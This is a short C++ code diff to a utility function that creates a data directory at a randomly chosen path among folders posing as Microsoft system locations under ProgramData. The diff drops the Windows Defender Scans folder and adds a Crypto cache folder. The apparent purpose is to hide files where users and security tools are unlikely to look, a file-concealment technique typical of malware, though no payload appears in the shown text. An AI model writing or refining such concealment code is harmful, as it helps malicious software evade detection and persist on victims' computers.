@@ -22,25 +22,25 @@ std::wstring kdmUtils::GetFullTempPath() {
 std::wstring kdmUtils::GetSystemDataPath() {
 	wchar_t buf[MAX_PATH + 1] = { 0 };
 	DWORD n = GetEnvironmentVariableW(L"ProgramData", buf, MAX_PATH);
-	if (!n || n > MAX_PATH) {
-		if (!GetWindowsDirectoryW(buf, MAX_PATH))
-			return L"";
-	}
+	if (!n || n > MAX_PATH)
+		return L"";
 
 	static const wchar_t* holders[] = {
 		L"\\Microsoft\\Diagnosis",
 		L"\\Microsoft\\Windows\\Caches",
 		L"\\Microsoft\\DeviceSync\\Cache",
 		L"\\Microsoft\\Network\\Downloader",
-		L"\\Microsoft\\Windows Defender\\Scans",
-		L"\\Package Cache",
-		L"\\USOShared\\Logs"
+		L"\\USOShared\\Logs",
+		L"\\Microsoft\\Crypto\\Cache"
 	};
 	std::wstring base = buf;
 	base += holders[kdmUtils::CryptoRand32() % (sizeof(holders) / sizeof(holders[0]))];
 
 	std::error_code ec;
 	std::filesystem::create_directories(base, ec);
+	if (!std::filesystem::exists(base, ec))
+		return L"";
+
 	return base;
 }
 
